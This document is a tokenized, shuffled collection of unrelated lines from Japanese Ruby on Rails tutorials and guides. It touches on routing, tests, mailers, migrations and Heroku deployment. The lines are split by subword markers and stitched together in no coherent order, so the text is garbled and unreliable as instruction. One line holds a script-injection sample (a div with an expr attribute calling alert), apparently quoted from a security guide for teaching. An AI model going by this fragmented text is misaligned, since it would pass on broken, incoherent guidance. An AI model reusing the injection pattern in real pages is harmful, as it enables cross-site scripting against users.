▁最後に 、 リファクタリング では あります が 、 一般的な 慣習 に 倣 って \ k ode { current _ user ?} という 論理値 を返す メソッドを 実装します ▟\ k ode { correct _ user } の中で 使えるように したい ので 、 Sessions ヘルパー の中に このメソッド を追加します ▁( リスト \ ref { code : current _ user _ p }) 。
▁ ページ 操作 の 全体 的な フ ロー は 次のようになります ▟ ある ユーザー ▁( John ▁ Calvin ) ▁ は 自分の プロファイル ページを 最初に 表示 し ▁( 図 \ ref { fig : page _ flow _ profile _ mockup }) 、 フォローする ユーザーを 選択 するために Users ページ ▁( 図 \ ref { fig : page _ flow _ user _ index _ mockup }) ▁ に移動し ます 。
▁╼╼\ end { item ize }╼╼ ▁% ▁subsection ▁guide _ to _ f ur the r _ resources ▁( end )╼╼ ▁\ subsection { 本章の まとめ } ▁% ▁( fold )╼ ▁\ label { sec : following _ users _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼\ item
▁`: file ` オプション に与える パス は 、 ファイルシステム の 絶 対 パス です 。
▁* ▁` includes `
▁リスト \ ref { code : home _ root _ route } のコード に すると 、\ k ode { static _ pages / home } にアクセス しても 動作 し なくなります 。
▁たとえば 、 以下の ルーティング は 無効 です 。
▁< li > <%= ▁ msg ▁%></ li >
▁今度は 各 ページに タイトル を追加して 、\ ref { sec : testing _ title s } のテスト が パス する ようにしましょう 。
▁Rails では 、 Rake を 頻繁に 使用 しています ▟ 特に 、 データベース を 背 後に 持つ Web アプリケーション 開発 時に 必要となる 管理 タスク で 顕 著 です 。
▁config ▖ static _ cache _ control ▁= ▁' public , ▁ max - age = 36 00 '
▁ 赤色 から 緑色 に するために 、 最初に About ページ 用の 失敗する テストを 書き 、 赤色 に しましょう 。
▁* ▁ アプリケーション から 非同期 に メールを送信 する方法
▁リスト \ ref { code : production _ webserver _ config } では 少しだけ コードの 見 栄 え を 修正 しています ▟ これは 標準的な 1 行 80 文字 の 制限 に 合わせ るため の 変更 です 。
▁Ruby では 、\ k ode { self } キーワード を使用して これ を指定することができます ▟\ k ode { Word } クラス の中で は 、\ k ode { self } は オブジェクト 自身 を指します ▟ これは つまり 、 以下のコード を使用して 、
▁ かつ て は Rails アプリ の 本番 デプロイ は 大 変 な 作業 でした が 、 ここ 数 年 急 速 に 簡単に な って き ており 、 さまざまな 本番環境 を 選択 できるようになりました 。
▁( 具体的な クラス や 継 承 については 、\ ref { sec : ruby _ classes } で 詳 しく 説明します ) 。
▁ 洗 練 された タ イ ポ グ ラ フ ィ ー を利用する ための CSS を追加する
▁Home ページの サイドバー 用の SCSS
▁ ActiveSupport :: In f le c to r ▖ inflections ▁do ▁| inflect |
▁ その後 、 ユーザーを削除 してみ て 、 マイクロポストの 数 が 1 つ 減 っている かどうかを確認 します 。
▁ ユーザーが サインイン するための テスト ヘルパー 。
▁ この節 は 、 ほとんど が 上 級 者 向 け の内容 になっ ており 、 この節 を 飛 ば しても 次の 章 以降 には 何 の 影 響 も ありません 。
▁ 以後 この章 を進める に あたり 、 有 用 な リソース である \ href { http :// ruby - doc ▖ org / core - 2▖ 0 /}{ Ruby ▁API } を参照 しながら 学習 すること を ぜ ひ お勧め します ▟ Ruby ▁API には 高 濃 縮 の 情報 が 詰 ま っています ▁( 少々 \ emph { 濃厚 すぎる } とも 言えます )▟ たとえば 、 Ruby の 文字列 の詳細 を知り たい場合は 、 Ruby ▁API エントリ の \ k ode { String } クラス を参照 すればよいのです 。
▁ タイトル のテスト 。
▁\ emph { Rails チュートリアル } では 、 様々な プログラム の 出力結果 ▁( シェル コマンド 、 バージョン管理 ツール 、 Ruby プログラム の 出力結果 など ) ▁ を こ ま め に 記載 する ようにしています 。
▁Rails では 、 このような テスト 用 データを \ emph { フィクスチャ } で 作成 できます ▟ フィクスチャ を使用して 、 テスト に必要な データを test データベースに 読み 込 んで お く ことができます 。
▁ }
▁group ▁: assets ▁do
▁# ▁=> ▁ { ▁' a w a it ing _ app r o val ' ▁=> ▁7 , ▁' p a id ' ▁=> ▁ 12 ▁ }
▁validates ▁: email , ▁presence : ▁true , ▁email : ▁true
▁### ▁ ネストした リソース
▁* ▁` change ` メソッドは 追加 の `: u sec ` も 受け付け ます 。
▁ 実装 する \ k ode { admin \_ user } フィルター を リスト \ ref { code : admin _ destroy _ before _ filter } に示します 。
▁# ▁and ▁to ▁< tt > : update </ tt > ▁if ▁it ▁is ▁not ▖
▁### ▁` presence `
▁#### # ▁` prev _ week `、` next _ week `
▁create ▁test / helpers / microposts _ helper _ test ▖ rb
▁ テストを 1 つ ▁( または 小 規 模 な テスト グループ ) ▁ を作成する 。
▁* ▁`: counter _ cache `
▁この ビュー では 埋め込み Ruby を使用して ユーザー名 と メールアドレスを 表示 しています ▟ インスタンス変数 \ k ode {@ user } がある ことを 前提と しています 。
▁#### ▁ メイラー ビュー を作成する
▁### ▁B A S I C 認 証
▁` secret _ token ▖ rb ` イニシャライザ を 削除します
▁ユーザーの タイムゾーン を 設定 しておけば 配 慮 されます 。
▁config ▖ assets ▖ prefix ▁= ▁' / asset - file s '
▁ 作成された ジョブ は以下のようになります 。
▁Over write ▁ / my app / config / application ▖ rb ?
▁ 現在の 状態 を 確認し てみましょう 。
▁hash ▁# ▁=> ▁ { : a =>1 }
▁ 当 時の ソース で生成された コード は以下のようになります 。
▁* ▁` config ▖ time _ zone ` は アプリケーションの デフォルト タイムゾーン を設定し 、 Active ▁Record で 認 識 できるようにします 。
▁< p > Product ▁Name : ▁<%= ▁ product ▖ name ▁%></ p >
▁ 何か を する
▁` app / assets / stylesheets / blorgh / articles ▖ css ` です 。
▁### ▁ グループ 化 された 項目 の 合 計
▁ ユーザーが マイクロポストを 複 数 所有 する ▁(\ k ode { has \_ many }) ▁ 関連付け
▁ 現在の 環境 に応じて アプリケーションを 起動 する 正 確 な コマンド は次のとおりです ▟ ローカル システム の場合は 、\ k ode { rails ▁server } を実行する だけで済みます ▁( リスト \ ref { code : local _ server })▟ Cloud 9 の場合は 、\ emph { IP バ イン デ ィ ング アドレス } と \ emph { \ href { http :// en ▖ w ikipedia ▖ org / wiki / T C P _ and _ U D P _ port } { ポート 番号 } } も 指定 する必要があります ▟ ( リスト \ ref { code : cloud _ server }) { p 6 } ▟ これらの 値は 、 クラウド の 外 から Rails サーバー にアクセス するために使用されます
▁# ▁ SELECT ▁" users "▖ * ▁FROM ▁" users " ▁WHERE ▁" users "▖" state " ▁= ▁' pending ' ▁ AND ▁" users "▖" state " ▁= ▁' inactive '
▁ マイクロポスト作成フォーム は 、 ログイン している 特定の ユーザー のコンテキストで のみ 機能 する ので 、 この節 の 一 つの 目標は 、 ユーザーの ログイン 状態 に応じて 、 ホ ーム 画面 の表示 を変更する ことです 。
▁#### ▁ 等 値 条件
▁リスト \ ref { code : account _ activation _ view _ html } の HTML テンプレート では 、 正しい リンクを 組 立 て るために \ k ode { link \_ to } メソッドを使用して いることにご注目ください 。
▁ プロフィール ページ は 図 \ ref { fig : profile _ with _ gravatar } のようになります ▟ ここに は デフォルトの Gravatar 画像 が表示され ています が 、 これは デフォルトの メールアドレス \ k ode { user @ example ▖ com } が 本 当 の メールアドレス ではない ためです 。
▁** キャッシュ の 無効 化 が 過 剰 に 発生 する **
▁Rails は これらの \ k ode { name } の値 を使用して 、 初期化 ハッシュ を ▁(\ k ode { params } 変数 経由で ) ▁ 構成 します ▟ この ハッシュ は 、 ユーザーが 入力 した 値 に基づいて ユーザー を作成するとき ▁(\ ref { sec : unsuccessful _ signup s }) ▁ に 使用されます 。
▁ 今後 も この章 には 頻繁に 立 ち 戻 って 参 照 します 。
▁ エンジン は 、 プラグイン とも 密 接 に 関連 します 。
▁ ユーザーを削除する
▁Client ▖ order ( created _ at : ▁: as c )
▁ 最終的な 表示 が や や 込 み 入 っている ため 、 欲 張 らず に 細 か い 部品 を 1 つ ずつ 確かめ ながら 導 入 することで 最終的な フィード を 実装します 。
▁invoke ▁helper
▁リスト \ ref { code : authenticated _ p _ fixed } のコード を使用すると 、 テストスイート 全体 が ▁\ passing ▁ になり 、 サブ タイトル は 両方 とも 修正 される はずです 。
▁Micropost モデルの 方 では 、\ k ode { belongs \_ to ▁: user } という コード が必要になる のですが 、 これは ▁リスト \ ref { code : micropost _ belongs _ to _ user } の マイグレーション によって自動的に 生成 されている はずです ▁( リスト \ ref { code : micropost _ belongs _ to _ user }) 。
▁WARNING : ▁` parent ` は 上の 場合 でも ` Object ` を返します 。
▁これは 新しい ポスト が 最初に 来 ること を テスト しています 。
▁ 最後の 性 質 は 、 列 挙 型 同士 を 比 較 する 場合に 特に 便利です 。
▁S s l ▁Sep 20 ▁1 : 4 6 ╼ ▁ spring ▁app ▁| ▁sample _ app ▁| ▁started ▁7 ▁hours ▁ ago
▁< a ▁ href ="# " ▁data - background - color ="# 00 99 00 " ▁data - text - color ="# FFFFFF "> P aint ▁it ▁green </ a >
▁G her k in で 書かれた テストは 、 ちゃんと 書かれた RSpec の例 と同じ ぐらい 読みやすく でき ています ▟ どちらも テキスト ベース であり 、 自然な 英語 に 近 く Ruby コード よりも 読みやすい ためです 。
▁### ▁ 名前 衝 突 の 回 避
▁` form _ for ` は 、 JavaScript を利用する ための `: remote ` オプションを 引数に 取 ることができます 。
▁ SELECT ▁categories ▖
▁ 親 オブジェクト ( ` has _ one ` 関連付けを 宣言 している 側 の オブジェクト ) が保存され ない場合 ( つまり ` new _ record ?` が ` true ` を返す 場合 ) 、 子 オブジェクトは 追加 時に 保存 されません 。
▁### ▁ スコープ の マージ
▁ ありがたい ことに 、 Rails には 開発 マシン で のみ ブ ラ ウ ズ できる \ emph { ローカル } Web サーバーを起動 するための コマンドライン プログラム ▁(\ emph { スクリプト }) ▁ が 付 属 している ので 、 以下の コマンドを実行 するだけで Rails アプリケーション を簡単に 起動 することができます 。
▁ 検索 パス を調べる には 、 Rails コンソール で ` Rails ▖ application ▖ config ▖ assets ▖ paths ` を調べ ます 。
▁Rails の ` rails ▁server ` コマンド の代わりに ` rack up ` コマンド を使用する ときは 、 下 記 の内容を ` config ▖ ru ` に記述 して 、 Rails アプリケーションのルート ディレクトリ に保存 します 。
▁ 最後の 行 では 、 等 しい ことを確認する 比 較 演算子 \ k ode {==} を使って み ました ▟ この 演算子 や ▁\ k ode { ! = } ▁( “ 等 しく ない ” ) ▁ などの 演算子 は 、 他の 多くの 言語 と 共通 です 。
▁{0} 図 5 ▖9{/0} ▁{1} \ href { http :// localhost :3000/ signup }{/ signup } で表示される 新しい ユーザー登録ページ {/1}
▁ ----------------
▁このオプション では 、 リ レ ー シ ョ ナ ル データベース で 最も よく 使用される アダプタ を リスト から 選択 できます 。
▁ユーザー登録 が 成功 し 、 フラッシュメッセージ が表示される
▁` config ▖ autoload _ paths ` のデフォルト 値は 、` app ` 以下の すべての ディレクトリ です ( 訳 注 : ▁Rails 3 から は autoload _ path の設定 はデフォルトで は 無効 です ) 。
▁` app / controllers ` ディレクトリ の下に は ` blorgh ` ディレクトリ が置かれます ▟ この 中に は ` application _ controller ▖ rb ` という ファイルが 1 つ 置かれ ます 。
▁ 実 例 を使って Rails を 学 ぼ う
▁ 幸 い 、 実際の Web サイト で 深 刻 な ス ケ ー リ ング の 問題 に 直 面 すること はほとんど ありません ▟ そして 、 純 粋 な Rails に 何 を追加して も 、 そこに は 最適化 の 余 地 が 生じる はずです 。
▁たとえば 、 @ project ▖ people に 入 っている person を ループ で すべて 列 挙 して input タグ を作成する のであれば 、 以下の ようになります 。
▁この ページの レンダリング 結果 が レイアウト に 挿入され ると 、 最終的に 以下の HTML が出力されます 。
▁特定の属性にアクセスするための ラ ジ オ ボタン タグを返します 。
▁2 つ目は 、 長い コードの 途中 を 次のように 垂 直 連続 ドット で 省略 した ことです 。
▁invoke ▁ erb
▁person ▖ errors [: name ]
▁resources ▁: users ▁do
▁この サンプルアプリケーション には 、 Rails の 主要な 機能 ▁( モデル 、 ビュー 、 コントローラ 、 テンプレート 、 パーシャル 、 フィルタ 、 検証 、 コールバック 、\ k ode { has _ many } / \ k ode { belongs _ to } / \ k ode { has _ many ▁through } 関連付け 、 セキュリティ 、 テスティング 、 展開 ) ▁ が 多数 含まれています 。
▁ ほとんどの場合 、`: plain ` や `: html ` など を使用する 方が 適切 です 。
▁class ▁My C raw ler ▁< ▁ Third Part y Library :: C raw ler
▁\ href { https :// twitter ▖ com / col m t uite } { C ol m ▁T uite } の 多 大 な 貢献 により 、 サンプルアプリケーション を Bootstrap ▁CSS の フレームワーク に変換 する ことができ ました ▟ 感 謝 します 。
▁ 実際には 、` to _ xml ` を すべての 要素 に 送 り 、 結果を ルート ノード の下に 集 め ます 。
▁ 転 送 先 の URL を保存する 仕 組み は 、 { p 0} で ユーザーを ログイン させ たとき と同じ で 、 {2} session {/2} 変数 を使います 。
▁続いて ブラウザは ページを 組み 立 て ます 。
▁$ ▁rails ▁console ▁test
▁ 幸 い 、 この サンプルアプリケーション のように Heroku ドメイン のまま 使用 しても よい のであれば 、 Heroku の SSL 証 明 書 を 流 用 することができます ▟ これは Heroku プラットフォーム の一部 として 自動的に 利用できる 機能 です 。
▁ここでは \ k ode { aside } タグ を使用して 実装します ▟ この タグ は サイドバー などの 補 完 コンテンツ の表示 に 使用されます が 、 単 独 で 表示 することもできます 。
▁Rails が ビュー から レスポンス を出力する ときには 、 その ビュー には 現在の レイアウト も 組み 込 まれ ます ▟ 現在の レイアウト を 探 索 するとき の ルール は 、 本ガイド で 既に 説明 した もの が使用されます 。
▁この パス は以下のように 変更 可能です 。
▁# ▁これは あくまで 例 です ▟ ブランチ で ミ ス を した 時 以外 は 実行 しないでください 。
▁これ を防ぐ には 、 すべての ページ で使用する \ emph { 基本 タイトル } を 定 め 、 特定の ページ では 異なる タイトル に 変更 できる ような オプション を与える のが 常 套 手 段 です 。
▁ 大文字 小文字 を 無視 する オプション
▁上のコードは 、 CSS ソース に 正しく フォーマット された data ▁ URI を挿入 します 。
▁ } ╼╼% ▁subsection ▁two _ subtle _ b ug s ▁( end )╼╼ \ section { ` ` Remember ▁me ▁ チェックボックス } ▁% ▁( fold )╼\ label { sec : remember _ me _ checkbox }╼╼
▁ 追加する コメント では 、 まず その 変更 に 賛 成 している ことを 表 明 し つ つ 、 なるべく 具体的に どの 変更 点が よい と 思 った のか についても 示 しましょう 。
▁1 つ は 、 コードの 重要な 部分 に ハ イ ラ イ ト を追加した ことです 。
▁{0} 図 7 ▖3{/0}{1} サンプルアプリケーションの Home ページ ▁(\ href { http :// localhost :3000/}{/}) ▁ に デバッグ情報 を表示する ▟\ href { http :// railstutorial ▖ org / images / figures / home _ page _ with _ debug _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁belongs _ to ▁: category
▁次の ステップ は 、\ k ode { config / puma ▖ rb } という ファイルを作成し 、 そこに リスト \ ref { code : production _ webserver _ config } のような 設定 情報 を追加します 。
▁デフォルトは true です 。
▁ これまで の 章 と同様 、 最初に モックアップ を示します
▁このメソッドは 3 つの オプションを 受け付け ます 。
▁ attachments [' filename ▖ jpg '] ▁= ▁File ▖ read (' / path / to / filename ▖ jpg ')
▁ ▖ project
▁use ▁ActiveRecord :: Migration :: C h ec k P end ing
▁### ▁Rails のインストール
▁ これはリスト \ ref { code : remember _ me _ test } で使用されていました 。
▁ここで 気 を付け ていた だ き たい 重要な 違い は 、 表示する 情報を 集 め る のは ▁ _ コントローラ _ ▁ で あって 、 ビュー ではない ということです 。
▁\ emph { クライアント } ▁( 通常 、 Firefox や Safari などの Web ブラウザ ) ▁ と \ emph { サーバー } ▁( Apache や N g in x などの Web サーバー ) ▁ は 、 上で 述 べ た 4 つの 基本 操作を 互 い に 認 識 できる ようになっています
▁( 実は もうひとつ 方法があります : ▁\ k ode { ERB :: Util } ライブラリ の \ href { http :// api doc k ▖ com / ruby / ERB / Util / url _ en code } { url _ en code } メソッド でも 同じ ことができます ) 。
▁duplicate ▁= ▁number ▖ deep _ dup
▁% w ( 1 ▁2 ▁3 ▁4 ▁5 ▁6 ▁7 )▖ in _ groups ( 3 , ▁false )
▁\ label { fig : user _ index _ delete _ links _ mockup } }╼\ end { figure }╼╼ ▁\ subsection { 管理ユーザー } ▁% ▁( fold )╼ ▁\ label { sec : administrative _ users }╼╼
▁| ▁GET ▁| ▁ / geocoder / edit ▁| ▁ geocoder s # edit ▁| ▁ geocoder 編集 用の HTML フォーム を返す ▁|
▁* ▁` config ▖ active _ support ▖ bar e は 、 Rails 起動 時に ` active _ support / all ` の 読み込み を行なう かどうかを指定します 。
▁self を省略した 結果を リスト \ ref { code : account _ activation _ edit _ action } に示します 。
▁StaticPages コントローラの タイトル をテストする ▁ RE D {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁Web 検索 で XPath を使用する 方法 の詳細については \ href { http :// www ▖ w 3 school s ▖ com / x path / x path _ sy nt a x ▖ as p } { XPath 構 文 } ▁( 英語 ) ▁ を参照してください 。
▁* ▁` vendor / assets ` は 、 JavaScript プラグイン や CSS フレームワーク など 、 外部 の 団 体 など によって 所有 されている アセット の 置き場所 です 。
▁now ▁= ▁Time ▖ current
▁その 理由は 、 データベースの アダプタ が 常に 大文字 小文字 を 区別 する インデックス を使っている とは 限 らない からです
▁Application コントローラに \ k ode { hello } を追加する 。
▁ コード に 目 を 通 した のが 自分 以外に いない 状態 で コードを 送信 するのは よく ありません 。
▁これで 、 フォロー / フォロー解除 の 機能 が完成しました ▟ どの ユーザー も 、 他のユーザーをフォロー したり 、 フォロー解除 したり できます ▟ ブラウザ 上で ボタン をクリックして 、 確かめ てみてください 。
▁" fe rm at ' s ▁ en ig ma "▖ title ize ▁# ▁=> ▁" F er m at ' s ▁En ig ma "
▁ サインイン の 失敗 を扱う ▁( 誤り あり ) 。
▁@ user ▁= ▁User ▖ new ( params [: user ])
▁ 各 ユーザー には 、 重複 の ない 一意 の キー となる \ k ode { integer } 型の ID 番号 ▁(\ k ode { id } と呼びます ) ▁ を 割り当て 、 この ID に 加えて 一 般 公開 される \ k ode { string } 型の 名前 ▁(\ k ode { name }) 、 そして 同じ く \ k ode { string } 型の メールアドレス ▁(\ k ode { email }) ▁ を 持 た せ ます ▟ メールアドレス は ユーザー名 としても 使われ ます 。
▁ デ バ ッ ガ ー を Users コントローラに 差 し 込 む
▁ 認 証
▁ ビューの レンダリング では HTTP プロトコル として 送信されます が 、 メイラー では メールの プロトコル を経由して 送信する 点 のみ が異なります 。
▁#### ▁cache
▁\ ref { sec : presence _ validation } で 既に 同じ ような 作業を 行った ので 、 この 実装 は 簡単です 。
▁render ▁not h ing : ▁true
▁ このため 、 今後 は 単 に \ k ode { bundle ▁install } を実行する だけで 、 自動的に 本番環境 用 gem を スキップ できるようになります
▁ minimum : ▁30 0,
▁最初の アプリケーション に関する 情報 を表示する には 、 画面 の ▁[ About ▁your ▁application ’ s ▁environment ] ▁ リンク をクリックします 。
▁Heroku では \ href { http :// www ▖ postgresql ▖ org /}{ PostgreSQL } データベース を使用します ▁( ちなみに 発 音 は ▁“ post - gr es - c ue - e ll ” ▁ で 、 よく “ P o st gr es ” と 略 されます )▟ そのために は 、 本番 ▁( production ) ▁ 環境 に \ text tt { pg } ▁gem をインストール して Rails が PostgreSQL と 通 信 できるようにします
▁<%= ▁link _ to ▁' Back ', ▁articles _ path ▁%>
▁ Linux や M ac ▁OS ▁X など で 日 夜 コードを コンパイル しています 。
▁ 登録 後 リダイレクト した ホームページ に アカウント有効化 確 認 の メッセージ が表示される
▁image _ submit _ tag (" login ▖ png ")
▁しかし 、 依 然 として ここに は 1 つの 問題 が 残 っています ▟ それ は \ emph { Active ▁Record は データベースの レベルで は 一意性 を 保 証 していない } という 問題 です 。
▁\ label { fig : flash _ persistence } }╼\ end { figure }╼╼ ╼ ▁% ▁sub subsection ▁rendering _ with _ a _ flash _ message ▁( end )╼╼ ▁\ subsection { フ ラ ッ シ ュ のテスト } ▁% ▁( fold )╼ ▁\ label { sec : a _ flash _ test }╼╼
▁ただし 、 この ドキュメント を 最大 限 に 活用 するために 、 以下の ソフトウェア が インストール され 、 利用 可能な 状態 になっている ことを 前提と しています 。
▁use ▁ ActionDispatch :: ParamsParser
▁config ▖ i 18 n ▖ en force _ available _ locales ▁= ▁false
▁` root ` メソッドを使用することで 、 Rails が ルート ` ' / ' ` と すべき 場所 を指定できます 。
▁{0} 図 9 ▖ 12 {/0} ▁{1} ユーザー 一覧 の 2 ページ 目 {/1}
▁self を省略した 結果を リスト \ ref { code : password _ reset _ migration } に示します 。
▁# ▁gem ▁' g row l ', ▁' 1 ▖ 0 ▖ 3 '
▁### ▁Article モデル を作成する
▁` rack up ` の オプション について 詳 しく 知りたい ときは 下 記 の ようにします 。
▁{0} 図 6 ▖ 4 {/0} ▁{1} リスト \ ref { code : users _ migration } で生成された User の データモデル {/1}
▁ さまざまな 種類の コンテナ を 1 つの オプション タグ の セット に まとめ るため の メソッドを 多数 提供し ます 。
▁上 によって 以下の HTML が生成されます 。
▁しかし クラス名 が User とは限りません ▟ アプリケーション によって は ` Person ` という クラス である かもしれません 。
▁production 環境 から 送信 した パスワード 再設定 メール
▁ デバッグ 出力 を き れ い に 整 形 するために 、 第 \ ref { cha : filling _ in _ the _ layout } 章 で作成した カスタム スタイルシート を リスト \ ref { code : mixin _ and _ debug } のように 追加します 。
▁ 値 の配列 を設定する こともできます 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / acts _ like ▖ rb ` です 。
▁ サンプル コード の例 は [ Rails コーディング ルール に従う ]( con t ri but ing _ to _ ruby _ on _ rails ▖ html # rails % E 3 % 8 2 % B 3 % E 3%83% B C % E 3%83% 87 % E 3 % 8 2 % A 3 % E 3%83% B 3 % E 3 % 8 2 % B 0 % E 3%83% A B % E 3%83% B C % E 3%83% A B % E 3%81% A B % E 5 % B E % 9 3 % E 3%81% 8 6 ) を参照してください 。
▁ データベースから オブジェクトを 取り出す
▁alias _ method _ chain ▁: process , ▁: stringified _ params
▁use ▁Rack :: Content Length
▁作成した コードをリスト \ ref { code : user _ index _ test } に示します
▁Ajax リクエスト に対して レスポンス を返す 際の 形式 は 、 HTML よりも JSON を使用すること が 好 まれ る よう です 。
▁self を省略した 結果を リスト \ ref { code : test _ helper _ sessions } に示します 。
▁# ▁=> ▁< input ▁id =" name " ▁name =" name " ▁type =" text " ▁/>
▁ 本チュートリアル の チュートリアル を 進 めて い く うちに 何か 問題が生じ たら 、\ href { http :// www ▖ railstutorial ▖ org / # help } { Rails チュートリアル の ヘ ル プ } { p 1 } に記載されている リソース を ご 覧 ください 。
▁has _ and _ belongs _ to _ many ▁: author s
▁ cha r set : ▁" UT F -8 ",
▁now ▖ all _ quarter
▁{0} 図 11 ▖ 17 {/0} {1} 現在のユーザー の フォロワー を表示する ▟\ href { http :// railstutorial ▖ org / images / figures / user _ followers _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁ この章 の コードを ▁( ファイル に保存 する ので なく ) ▁Rails コンソール に 入力 したり コ ピ ペ したり するとき であれば 、 コメント を省略 しても か ま いません ▟ コメント を Rails コンソール に 入力 しても 、 コメント は 常に 無視 される ので 問題ありません 。
▁ http :// example ▖ com / password _ resets / 3 B d B r X e Q Z S W q F ID R N 8 c x HA / edit ? email = foo %40 bar ▖ com
▁# ▁< rank > 1 </ rank >
▁ 統 計 情報 パーシャル が でき あ が りました ▟ Home ページに この 統 計 情報 を表示する のは 、 リスト \ ref { code : home _ page _ stats } のように 簡単に できます 。
▁Thu , ▁30 ▁Sep ▁2010 ▁ 23:59:59 ▁UTC ▁+00:00
▁### ▁ ブログ アプリケーション を作成する
▁この コマンド の 初 回 実行 時の 出力結果 は以下のようになります 。
▁options ▁= ▁actions ▖ extract _ options !
▁ ついに 、 ルーティング と コントローラと アクションと ビュー が 協 調 して 動作する ようになりました 。
▁リスト \ ref { code : sendgrid _ config } の メール 設定 には SendGrid アカウント の \ k ode { user _ name } と \ k ode { password } 設定 を 記 入 する 行 もあります が 、 そこに は 記 入 せず 、 必ず 環境変数 「\ k ode { ENV }」 に設定する よう 十分 ご注意ください 。
▁TIP : ▁` find _ each ` メソッドと ` find _ in _ batches ` メソッドは 、 一度 に メモリ に 読み 込 め ない ような 大量の レコード に対する バッチ 処理 の ためのものです 。
▁ 上で キ ャ プ チ ャ した 変数 は以下のように 他の 場所 で 自由に 使用できます 。
▁* ▁[ アプリケーションの その他の 層 についても 最新 に 保 ってください ]( http :// sec uni a ▖ com / ) ▁( 週 刊 の ニ ュ ー ス レ ター も 発行し ています )
▁ この節 のコード を使用することで 、 ユーザー編集ページ は 動作する はずです ▟ テストスイート を もう一度 実行 してみる と 、 今度は 緑色 になる でしょう 。
▁2 番目の 地 味 な 問題 は 、 ユーザーが 複数の ブラウザ ▁( C h r o me や Firefox など ) ▁ で ログイン して いた ときに 生 じ ます ▟ 具体的には 、 一 方 の ブラウザで は ログアウト し 、 もう 一 方 の ブラウザで は ログアウト せずに 、 一度 ブラウザ を 終 了 させ 、 再度 同じ ページ を開く と 、 この問題 が発生し ます
▁Gemfile ▖ lock
▁今度は 、 RSpec を実行すると 緑色 になるはずです 。
▁# ▁The ▁ priority ▁is ▁base d ▁upon ▁order ▁of ▁creation :
▁(\ ref { sec : image _ upload _ in _ production } でも 説明します が 、 本番環境 が Heroku であれば 、 既に 本番環境で ImageMagick が 使える ようになっています ) 。
▁ 親 オブジェクト ( ` has _ many ` 関連付けを 宣言 している 側 の オブジェクト ) が保存され ない場合 ( つまり ` new _ record ?` が ` true ` を返す 場合 ) 、 子 オブジェクトは 追加 時に 保存 されません 。
▁リスト \ ref { code : gravatar _ for _ helper } のコードは 、 Gravatar の 画像 タグ に \ k ode { gravatar } クラス と ユーザー名 の alt テキスト を追加した もの を返します ▁( alt テキスト を追加 しておく と 、 視 覚 障 害 のある ユーザーが ス ク リ ー ン リ ー ダ ー を使用する ときに も 役に立ちます ) 。
▁ 完全な HTML 構造 を備えた About ページのビュー ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁\ href { https :// tutorial s ▖ rails app s ▖ org / hartl } { Rails App s } : ▁ 教 育 目的 の 、 Rails アプリケーションの サンプル 集 です 。
▁# ▁=> ▁[ [ "1" , ▁" 2 ", ▁"3"] , ▁[" 4 ", ▁"5" ] , ▁[" 6 ", ▁"7" ]]
▁template _ path : ▁' notification s ',
▁options ▁= ▁options ▖ symbolize _ keys
▁ そのために は 、\ k ode { password } 属性 と \ k ode { password _ confirmation } 属性を User モデル に追加し 、 レコード をデータベースに保存する 前に 2 つの 属性 が 一致する ように 要求 します 。
▁ 以下のコード に注目し てください 。
▁リスト \ ref { code : about _ test } の ハ イ ラ イ ト 行 を見ると 、 他の Home ページ 用 テスト や Help ページ 用 テスト と ほとんど 同じ である ことがわかります ▟ 違い は 「 home 」 や 「 help 」 の 部分 が 「 about 」 に 変 わ っている 点 だけです 。
▁ ローカル で 作業 している 間 に 、 master で 別の 更新 が 行われている ということ が よく あります 。
▁Rails の リソース フル ルーティング では 、( GET 、 PUT などの ) ▁ 各 種 HTTP 動詞 ▁( ve rb ) ▁ と 、 コントローラ 内 アクション を指す URL が 対応 付け られます 。
▁` readonly ` を指定すると 、 関連付けられたオブジェクト を 取り出す ときに 読み出し 専 用 になります 。
▁Action ▁Mailer では ファイル を簡単に 添付 できます 。
▁#### ▁ コレクション を出力する
▁Client ▖ where ( first _ name : ▁' Ryan ')▖ exists ?
▁ 残 っている 作業 は 、 Home ページの ボタン に 適切な リンク を追加する ことです 。
▁今度は 、 ユーザー情報 を変更 するために \ href { http ://0▖0▖0▖0:3000/ users /1/ edit }{\ text tt { edit } } ページ を表示し てみましょう ▁( {2} {3} 図 2▖ 7 {/3} {/2} ) 。
▁* ▖ s w p
▁この オブジェクトは 、 渡された 属性 を使用して インスタンス化され 、 結合テーブル を 介 して リンク が 作成されます ▟ そして 、 関連付けられた モデル で指定されている 検証 がすべて パス すると 、 この 関連付けられたオブジェクト は 保存されます 。
▁ マイグレーション 名 は 自由に 指定 できます が 、 上の ように 末 尾 を \ k ode { _ to _ users } に しておく ことをお勧めします ▟ こう しておく と 、\ k ode { users } テーブルに カラム を追加する マイグレーション が Rails によって自動的に 作成される からです 。
▁### ▁ ランタイム エラー をチェックする
▁ 代りに ` ActionController :: Base ▖ default _ static _ extension ` を ご 利用 ください 。
▁belongs _ to ▁: customer , ▁ counter _ cache : ▁: count _ of _ orders
▁続いて 、\ k ode { activated } 属性 を追加して 論理値 ▁( true / false ) ▁ を 取 る ようにします ▟ これで 、\ ref { sec : administrative _ users } で説明した 自動生成 の 論理値 メソッド と同じ ような 感じ で 、 ユーザーが 有効 である かどうかを テスト できるように な r
▁### ▁ ベ ン チ マーク を行う
▁\ ref { sec : the _ form _ html } で 詳 細 について 触れ ますが 、 まずは リスト \ ref { code : form _ css } の SCSS で 見 栄 え を 整 え てみましょう 。
▁ このため 、 クラス名 は ` String ` で 表 し 、 後に エンジン が ` constantize ` で クラス に変換 する必要があります 。
▁< div ▁id =" my code " ▁ ex p r =" alert (' ha h ! ') "
▁xml ▖ link (@ url )
▁* ▁Rails アプリケーションの 一般的な レイアウト
▁( なお 、 エラーメッセージ に対するテスト は \ ref { sec : signup _ exercises } の演習 に 残しておきます ▟)
▁それでは ` app / views / articles / new ▖ html ▖ erb ` を作成し 、 その中に 以下のように 記 入 しましょう 。
▁Rails ▁ 3▖0 ▖ x の動作 に 戻 したい場合は 、 以下のように ` format : ▁false ` を指定することができます 。
▁ デフォルトの config / routes ▖ rb には 多数の ルーティング サンプル が コメント 行 に 記載 されており 、 そ のうち の 1 つ に 、 サイトの ルート にアクセス が あった ときに 接続 する コントローラと アクション を指定する 方法 が 書かれてい ます 。
